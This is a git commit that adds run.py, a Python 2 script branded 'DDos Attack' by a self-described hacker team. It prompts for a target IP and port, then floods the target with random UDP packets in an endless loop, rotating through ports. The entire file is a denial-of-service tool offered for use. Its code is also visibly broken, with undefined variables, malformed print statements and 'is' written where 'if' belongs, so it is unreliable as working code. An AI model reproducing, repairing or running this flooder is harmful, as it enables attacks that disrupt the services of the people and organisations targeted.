8f3a7e52174991276114c2ceb73c536e4d720554
hadimin121 <41132054+hadimin121@users.noreply.github.com>
2018-07-12 08:16:31 +0700

    Create run.py

---
+++ run.py
@@ -0,0 +1,50 @@
+import sys
+import os
+import time
+import socket
+import random
+#Waktunya Code
+from datetime import datetime
+how = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##########################
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+##########################
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Create  : r4mb0Attack"
+print "Team    : Tengkorak Hacker Team"
+print "github  : https://github.comr4mb0Attack"
+print "Facebook: https://www.facebook.com/hadinurusalam
+print
+ip = raw_input("IP TARGET : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                     ] 0% "
+time.sleep(5)
+print "[=====                ] 25%"
+time.sleep(5)
+print :[===========          ] 50%"
+time.sleep(5)
+print :[================     ] 75%"
+time.sleep(5)
+print :[=====================] 100%"
+time.sleep(3)
+sent = 0 
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "sent %s packet %s throught port:%s"(sent,ip,port)
+     is port == 65534:
+       port = 1
